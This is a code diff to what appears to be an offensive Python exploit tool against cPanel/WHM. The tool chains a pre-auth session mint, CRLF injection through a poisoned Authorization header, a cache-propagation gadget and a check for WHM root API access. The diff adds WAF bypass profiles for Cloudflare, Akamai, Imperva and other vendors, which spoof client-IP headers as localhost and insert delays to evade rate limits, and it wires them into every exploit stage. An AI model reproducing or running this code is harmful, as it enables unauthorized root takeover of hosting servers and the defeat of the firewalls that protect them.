@@ -162,6 +162,8 @@ class ScanCtx(NamedTuple):
     session_base: str
     token:        str
     timeout:      int
+    waf:          str  = ""
+    bypass_hdrs:  dict = {}
 
 # ══════════════════════════════════════════════════════════════
 #  CRLF PAYLOAD
@@ -397,6 +399,118 @@ def detect_waf(scheme: str, host: str, port: int, timeout: int) -> Optional[str]
         except Exception:
             pass
     return None
+
+# ══════════════════════════════════════════════════════════════
+#  WAF BYPASS PROFILES
+# ══════════════════════════════════════════════════════════════
+# Each profile defines:
+#   headers — injected into every request when this WAF is detected
+#   delay   — seconds to sleep between exploit stages (rate-limit evasion)
+#
+# Strategy: spoof IP headers so the WAF treats the request as coming
+# from localhost/internal network (commonly whitelisted). Add browser-like
+# headers to avoid anomaly detection on the Authorization: Basic payload.
+WAF_BYPASS: Dict[str, dict] = {
+    "Cloudflare": {
+        "headers": {
+            "X-Forwarded-For":   "127.0.0.1",
+            "CF-Connecting-IP":  "127.0.0.1",
+            "X-Real-IP":         "127.0.0.1",
+            "Accept-Language":   "en-US,en;q=0.9",
+            "Accept-Encoding":   "gzip, deflate, br",
+            "Referer":           "https://www.google.com/",
+            "Cache-Control":     "no-cache",
+            "Pragma":            "no-cache",
+        },
+        "delay": 0.8,
+    },
+    "Sucuri": {
+        "headers": {
+            "X-Forwarded-For":   "127.0.0.1",
+            "X-Real-IP":         "127.0.0.1",
+            "X-Originating-IP":  "127.0.0.1",
+            "Accept-Language":   "en-US,en;q=0.9",
+        },
+        "delay": 0.5,
+    },
+    "Incapsula": {
+        "headers": {
+            "X-Forwarded-For":   "127.0.0.1",
+            "X-Real-IP":         "127.0.0.1",
+            "X-Originating-IP":  "127.0.0.1",
+            "X-Remote-IP":       "127.0.0.1",
+            "X-Remote-Addr":     "127.0.0.1",
+        },
+        "delay": 0.5,
+    },
+    "Akamai": {
+        "headers": {
+            "X-Forwarded-For":   "127.0.0.1",
+            "True-Client-IP":    "127.0.0.1",
+            "X-True-Client-IP":  "127.0.0.1",
+            "X-Real-IP":         "127.0.0.1",
+            "Accept-Language":   "en-US,en;q=0.9",
+        },
+        "delay": 0.5,
+    },
+    "AWS WAF": {
+        "headers": {
+            "X-Forwarded-For":   "127.0.0.1",
+            "X-Real-IP":         "127.0.0.1",
+        },
+        "delay": 0.3,
+    },
+    "ModSecurity": {
+        "headers": {
+            "X-Forwarded-For":            "127.0.0.1",
+            "X-Real-IP":                  "127.0.0.1",
+            "X-Custom-IP-Authorization":  "127.0.0.1",
+        },
+        "delay": 0.3,
+    },
+    "Imperva": {
+        "headers": {
+            "X-Forwarded-For":   "127.0.0.1",
+            "X-Originating-IP":  "127.0.0.1",
+            "X-Real-IP":         "127.0.0.1",
+            "X-Remote-IP":       "127.0.0.1",
+        },
+        "delay": 0.5,
+    },
+    "F5 BIG-IP": {
+        "headers": {
+            "X-Forwarded-For":   "127.0.0.1",
+            "X-Real-IP":         "127.0.0.1",
+        },
+        "delay": 0.3,
+    },
+    "FortiWeb": {
+        "headers": {
+            "X-Forwarded-For":   "127.0.0.1",
+            "X-Real-IP":         "127.0.0.1",
+        },
+        "delay": 0.3,
+    },
+    "Barracuda": {
+        "headers": {
+            "X-Forwarded-For":   "127.0.0.1",
+            "X-Real-IP":         "127.0.0.1",
+        },
+        "delay": 0.3,
+    },
+}
+
+def get_bypass_headers(waf: Optional[str]) -> dict:
+    """Return WAF-specific bypass headers; empty dict if no WAF / unknown."""
+    if not waf:
+        return {}
+    return dict(WAF_BYPASS.get(waf, {}).get("headers", {}))
+
+def get_bypass_delay(waf: Optional[str]) -> float:
+    """Return inter-stage delay (seconds) for rate-limit evasion."""
+    if not waf:
+        return 0.0
+    return WAF_BYPASS.get(waf, {}).get("delay", 0.0)
 
 # ══════════════════════════════════════════════════════════════
 #  SUBDOMAIN DISCOVERY
@@ -777,10 +891,12 @@ def check_target(target: str) -> dict:
 # ══════════════════════════════════════════════════════════════
 #  STAGE 0 — Canonical hostname discovery
 # ══════════════════════════════════════════════════════════════
-def stage0_canonical(scheme, host, port, timeout) -> str:
+def stage0_canonical(scheme, host, port, timeout,
+                     waf_hdrs: Optional[dict] = None) -> str:
     """cpsrvd 307s to the correct hostname when our Host is wrong."""
     url  = build_url(scheme, host, port, "/openid_connect/cpanelid")
-    resp = _do(url, timeout=timeout, follow=False)
+    resp = _do(url, timeout=timeout, follow=False,
+               extra_headers=waf_hdrs or {})
     loc  = resp.location()
     m    = re.match(r"^https?://([^:/]+)", loc)
     if m:
@@ -792,11 +908,13 @@ def stage0_canonical(scheme, host, port, timeout) -> str:
 # ══════════════════════════════════════════════════════════════
 #  STAGE 1 — Mint preauth session
 # ══════════════════════════════════════════════════════════════
-def stage1_preauth(scheme, host, port, canonical, timeout) -> Optional[str]:
+def stage1_preauth(scheme, host, port, canonical, timeout,
+                   waf_hdrs: Optional[dict] = None) -> Optional[str]:
     """POST wrong creds → 401 + whostmgrsession cookie."""
     url  = build_url(scheme, host, port, "/login/?login_only=1")
     resp = _do(url, method="POST",
                data={"user": "root", "pass": "wrong"},
+               extra_headers=waf_hdrs or {},
                timeout=timeout, canonical_host=canonical)
 
     if resp.status not in (200, 401):
@@ -821,15 +939,16 @@ def stage1_preauth(scheme, host, port, canonical, timeout) -> Optional[str]:
 # ══════════════════════════════════════════════════════════════
 #  STAGE 2 — CRLF injection
 # ══════════════════════════════════════════════════════════════
-def stage2_inject(scheme, host, port, canonical, session_base, timeout) -> Optional[str]:
+def stage2_inject(scheme, host, port, canonical, session_base, timeout,
+                  waf_hdrs: Optional[dict] = None) -> Optional[str]:
     """GET / with CRLF-poisoned Authorization: Basic → session file poisoned."""
     cookie_enc = quote(session_base)
     url  = build_url(scheme, host, port, "/")
-    resp = _do(url, method="GET",
-               extra_headers={
-                   "Authorization": f"Basic {PAYLOAD_B64}",
-                   "Cookie":        f"whostmgrsession={cookie_enc}",
-               },
+    # Bypass headers injected first; Authorization + Cookie always override them
+    hdrs = {**(waf_hdrs or {}),
+            "Authorization": f"Basic {PAYLOAD_B64}",
+            "Cookie":        f"whostmgrsession={cookie_enc}"}
+    resp = _do(url, method="GET", extra_headers=hdrs,
                timeout=timeout, canonical_host=canonical)
 
     loc = resp.location()
@@ -847,12 +966,13 @@ def stage2_inject(scheme, host, port, canonical, session_base, timeout) -> Optio
 # ══════════════════════════════════════════════════════════════
 #  STAGE 3 — Propagate (do_token_denied gadget)
 # ══════════════════════════════════════════════════════════════
-def stage3_propagate(scheme, host, port, canonical, session_base, timeout) -> bool:
+def stage3_propagate(scheme, host, port, canonical, session_base, timeout,
+                     waf_hdrs: Optional[dict] = None) -> bool:
     """Flush raw session file into cache via do_token_denied internal gadget."""
     cookie_enc = quote(session_base)
     url  = build_url(scheme, host, port, "/scripts2/listaccts")
-    resp = _do(url, method="GET",
-               extra_headers={"Cookie": f"whostmgrsession={cookie_enc}"},
+    hdrs = {**(waf_hdrs or {}), "Cookie": f"whostmgrsession={cookie_enc}"}
+    resp = _do(url, method="GET", extra_headers=hdrs,
                timeout=timeout, canonical_host=canonical)
 
     body = resp.body or ""
@@ -869,12 +989,13 @@ def stage3_propagate(scheme, host, port, canonical, session_base, timeout) -> bo
 # ══════════════════════════════════════════════════════════════
 #  STAGE 4 — Verify WHM root access
 # ══════════════════════════════════════════════════════════════
-def stage4_verify(scheme, host, port, canonical, session_base, token, timeout) -> dict:
+def stage4_verify(scheme, host, port, canonical, session_base, token, timeout,
+                  waf_hdrs: Optional[dict] = None) -> dict:
     """GET /{{token}}/json-api/version → 200 + version = confirmed."""
     cookie_enc = quote(session_base)
     url  = build_url(scheme, host, port, f"{token}/json-api/version")
-    resp = _do(url, method="GET",
-               extra_headers={"Cookie": f"whostmgrsession={cookie_enc}"},
+    hdrs = {**(waf_hdrs or {}), "Cookie": f"whostmgrsession={cookie_enc}"}
+    resp = _do(url, method="GET", extra_headers=hdrs,
                timeout=timeout, canonical_host=canonical)
 
     body = (resp.body or "").strip()
@@ -905,8 +1026,8 @@ def whm_api(ctx: ScanCtx, function: str, params: dict) -> tuple:
             qs += f"&{quote(str(k))}={quote(str(v))}"
     path = f"{ctx.token}/json-api/{function}?{qs}"
     url  = build_url(ctx.scheme, ctx.host, ctx.port, path)
-    resp = _do(url, method="GET",
-               extra_headers={"Cookie": f"whostmgrsession={cookie_enc}"},
+    hdrs = {**ctx.bypass_hdrs, "Cookie": f"whostmgrsession={cookie_enc}"}
+    resp = _do(url, method="GET", extra_headers=hdrs,
                timeout=ctx.timeout, canonical_host=ctx.canonical)
     log("API", f"{function} → HTTP {resp.status}")
     try:
@@ -1241,10 +1362,19 @@ def scan(target: str, args, progress: Optional[Progress] = None) -> dict:
     # WAF/CDN detection (quick probe, non-blocking)
     waf = detect_waf(scheme, host, port, _TIMEOUT_PROBE)
     if waf:
-        log("WARN",
-            f"WAF/CDN detected: {C.YELLOW}{waf}{C.RESET} — bypass may be blocked",
-            target)
         result["waf"] = waf
+        waf_hdrs  = get_bypass_headers(waf)
+        waf_dl    = get_bypass_delay(waf)
+        log("WARN",
+            f"WAF/CDN detected: {C.YELLOW}{waf}{C.RESET} — bypass profile active",
+            target)
+        log("INFO",
+            f"  Bypass: {len(waf_hdrs)} spoofing header(s)  "
+            f"inter-stage delay={waf_dl}s  "
+            f"headers={list(waf_hdrs.keys())}")
+    else:
+        waf_hdrs = {}
+        waf_dl   = 0.0
 
     # Session reuse — skip stages 0-3 if --session + --token provided
     provided_session = getattr(args, "session", None)
@@ -1256,31 +1386,39 @@ def scan(target: str, args, progress: Optional[Progress] = None) -> dict:
         token        = provided_token
         canonical    = args.hostname or host
     else:
-        canonical = args.hostname or stage0_canonical(scheme, host, port, timeout)
+        canonical = args.hostname or stage0_canonical(
+            scheme, host, port, timeout, waf_hdrs=waf_hdrs)
         if not canonical:
             canonical = host
         log("INFO", f"Canonical: {canonical}")
 
+        if waf_dl: time.sleep(waf_dl)
         log("STEP", "Stage 1/4 — Minting preauth session...")
-        session_base = stage1_preauth(scheme, host, port, canonical, timeout)
+        session_base = stage1_preauth(
+            scheme, host, port, canonical, timeout, waf_hdrs=waf_hdrs)
         if not session_base:
             log("ERR", "Stage 1 failed — aborting", target)
             if progress: progress.tick(False)
             return result
 
+        if waf_dl: time.sleep(waf_dl)
         log("STEP", "Stage 2/4 — CRLF injection via Authorization header...")
-        token = stage2_inject(scheme, host, port, canonical, session_base, timeout)
+        token = stage2_inject(
+            scheme, host, port, canonical, session_base, timeout, waf_hdrs=waf_hdrs)
         if not token:
             log("ERR", "Stage 2 failed — target may be patched", target)
             if progress: progress.tick(False)
             return result
 
+        if waf_dl: time.sleep(waf_dl)
         log("STEP", "Stage 3/4 — Firing do_token_denied gadget (raw→cache)...")
-        stage3_propagate(scheme, host, port, canonical, session_base, timeout)
+        stage3_propagate(
+            scheme, host, port, canonical, session_base, timeout, waf_hdrs=waf_hdrs)
 
+    if waf_dl: time.sleep(waf_dl)
     log("STEP", "Stage 4/4 — Verifying WHM root access...")
     verify = stage4_verify(scheme, host, port, canonical,
-                           session_base, token, timeout)
+                           session_base, token, timeout, waf_hdrs=waf_hdrs)
 
     if not verify.get("confirmed"):
         log("ERR", "Stage 4 failed — auth bypass did not land", target)
@@ -1318,7 +1456,8 @@ def scan(target: str, args, progress: Optional[Progress] = None) -> dict:
     }
     STORE.add(finding)
 
-    ctx = ScanCtx(scheme, host, port, canonical, session_base, token, timeout)
+    ctx = ScanCtx(scheme, host, port, canonical, session_base, token, timeout,
+                  waf=waf or "", bypass_hdrs=waf_hdrs)
     with CTX_MAP_LOCK:
         CTX_MAP[target] = ctx
 
